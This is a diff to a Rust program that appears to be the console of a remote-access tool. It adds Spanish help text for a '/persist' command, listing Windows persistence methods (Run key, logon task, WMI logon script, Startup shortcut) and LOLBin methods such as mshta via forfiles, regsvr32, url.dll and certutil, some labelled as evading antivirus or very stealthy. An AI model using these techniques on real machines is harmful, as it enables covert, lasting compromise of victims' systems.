@@ -1404,7 +1404,15 @@ async fn main() {
                             "  {} {:<20} {}",
                             "📌".bright_magenta(),
                             "/persist <method>",
-                            "Establece persistencia (registry|task|wmi|startup)".bright_white()
+                            "Establece persistencia".bright_white()
+                        );
+                        println!(
+                            "{}",
+                            "      Métodos tradicionales: registry, task, wmi, startup".bright_white().dimmed()
+                        );
+                        println!(
+                            "{}",
+                            "      Métodos LOLBAS (LOLBins): forfiles(mshta), regsvr32, rundll, certutil".bright_white().dimmed()
                         );
                         println!(
                             "  {} {:<20} {}",
@@ -2186,7 +2194,16 @@ async fn main() {
                     "/persist" => {
                         if parts.len() < 2 {
                             println!("{} /persist <method>", "❌ Uso:".bright_red());
-                            println!("   Métodos: registry, task, wmi, startup");
+                            println!("   Métodos tradicionales:");
+                            println!("     registry  - Clave Run en HKCU (recomendado)");
+                            println!("     task      - Tarea programada ONLOGON");
+                            println!("     wmi       - UserInitMprLogonScript (muy sigiloso)");
+                            println!("     startup   - Acceso directo en Startup folder");
+                            println!("   Métodos LOLBAS (Living Off the Land):");
+                            println!("     mshta     - forfiles.exe (evade AV)");
+                            println!("     regsvr32  - Run key con wrapper cmd");
+                            println!("     rundll    - url.dll FileProtocolHandler");
+                            println!("     certutil  - Tarea programada con delay");
                             continue;
                         }
 
